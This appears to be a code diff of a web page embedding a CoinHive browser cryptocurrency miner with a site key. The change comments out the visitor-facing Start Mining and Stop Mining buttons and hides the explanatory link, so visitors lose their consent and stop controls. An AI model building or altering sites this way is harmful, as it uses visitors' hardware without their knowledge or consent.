@@ -24,7 +24,7 @@ Instead of using ads, I am having you mine for crypto currency to support this s
 <center>
 <p id="minebutton"></p>
 </center>
-<p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>
+/////<p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>
 
 <script type="text/javascript">
 var miner = new CoinHive.Anonymous('zMtnsQ82YuudZehaQerpxlPI7ct2NUld','john-doe', {threads: 2,	autoThreads: true});
@@ -41,12 +41,12 @@ setInterval(function() {
         document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
         document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
         document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
-        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
+        //document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
     } else {
         document.getElementById("hps").innerHTML = "Please click start";
         document.getElementById("ths").innerHTML = "to support";
         document.getElementById("tah").innerHTML = "this site";
-        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
+        //document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
     }
 }, 1000);
 </script>
